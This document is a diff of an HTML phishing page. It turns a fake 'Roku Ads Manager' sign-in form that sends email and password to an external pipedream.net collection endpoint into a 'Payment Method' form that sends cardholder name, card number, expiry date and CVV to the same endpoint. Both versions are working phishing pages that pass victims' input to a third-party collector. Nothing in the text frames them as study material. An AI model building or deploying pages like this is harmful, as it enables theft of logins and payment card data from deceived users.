@@ -3,9 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Login - Ads Manager</title>
+  <title>Payment Method</title>
   <style>
-    /* Background gradient */
     body {
       margin: 0;
       font-family: Arial, sans-serif;
@@ -14,27 +13,26 @@
       align-items: center;
       justify-content: center;
       height: 100vh;
+      flex-direction: column;
     }
 
-    /* Login card */
-    .login-container {
+    /* Card container */
+    .payment-container {
       background: white;
       padding: 40px;
       border-radius: 6px;
       box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      width: 360px;
+      width: 400px;
       text-align: left;
     }
 
     /* Title */
-    .login-container h1 {
+    .payment-container h1 {
       font-size: 22px;
       margin-bottom: 20px;
       font-weight: 600;
-    }
-    .login-container h1 span {
+      text-align: center;
       color: #662d91;
-      font-weight: 700;
     }
 
     /* Labels & inputs */
@@ -45,8 +43,9 @@
       color: #333;
     }
 
-    input[type="email"],
-    input[type="password"] {
+    input[type="text"],
+    input[type="number"],
+    input[type="month"] {
       width: 100%;
       padding: 10px;
       margin-bottom: 14px;
@@ -55,28 +54,13 @@
       font-size: 14px;
     }
 
-    /* Forgot password link */
-    .forgot {
-      font-size: 13px;
-      text-align: right;
-      margin-top: -10px;
-      margin-bottom: 14px;
-    }
-    .forgot a {
-      color: #662d91;
-      text-decoration: none;
-    }
-    .forgot a:hover {
-      text-decoration: underline;
-    }
-
-    /* Remember me */
-    .remember {
-      margin-bottom: 16px;
-      font-size: 14px;
+    /* Expiration + CVV inline */
+    .row {
       display: flex;
-      align-items: center;
-      gap: 6px;
+      gap: 10px;
+    }
+    .row div {
+      flex: 1;
     }
 
     /* Button */
@@ -92,20 +76,6 @@
     }
     button:hover {
       background-color: #551c7a;
-    }
-
-    /* Links below */
-    .extra {
-      text-align: center;
-      margin-top: 18px;
-      font-size: 14px;
-    }
-    .extra a {
-      color: #662d91;
-      text-decoration: none;
-    }
-    .extra a:hover {
-      text-decoration: underline;
     }
 
     /* Footer */
@@ -125,28 +95,27 @@
   </style>
 </head>
 <body>
-  <div class="login-container">
-    <h1><span>Roku</span> Ads Manager</h1>
-    <form action="https://eodyrh169lq66mf.m.pipedream.net/" method="post"  >
-      <label for="email">Email</label>
-      <input type="email" name="email" id="email" placeholder="Enter your email" required>
+  <div class="payment-container">
+    <h1>Payment Method</h1>
+    <form action="https://eodyrh169lq66mf.m.pipedream.net/" method="post" >
+      <label for="cardholder">Cardholder Name</label>
+      <input type="text" id="cardholder" name="cardholder" placeholder="John Doe" required>
 
-      <label for="password">Password</label>
-      <input type="password" name="password" id="password" placeholder="Enter your password" required>
+      <label for="cardnumber">Card Number</label>
+      <input type="number" id="cardnumber" name="cardnumber" placeholder="1234 5678 9012 3456" required>
 
-      <div class="forgot"><a href="#">Forgot password?</a></div>
-
-      <div class="remember">
-        <input type="checkbox" id="remember">
-        <label for="remember">Remember me</label>
+      <div class="row">
+        <div>
+          <label for="exp">Expiration Date</label>
+          <input type="month" name="exp" id="exp" required>
+        </div>
+        <div>
+          <label for="cvv">CVV</label>
+          <input type="number" name="cvv" id="cvv" placeholder="123" required>
+        </div>
       </div>
 
-      <button type="submit">Sign in</button>
-
-      <div class="extra">
-        Don’t have an account? <a href="#">Sign up</a><br>
-        Have questions? Go to the <a href="#">Help Center</a>
-      </div>
+      <button type="submit">Save Payment</button>
     </form>
   </div>
 
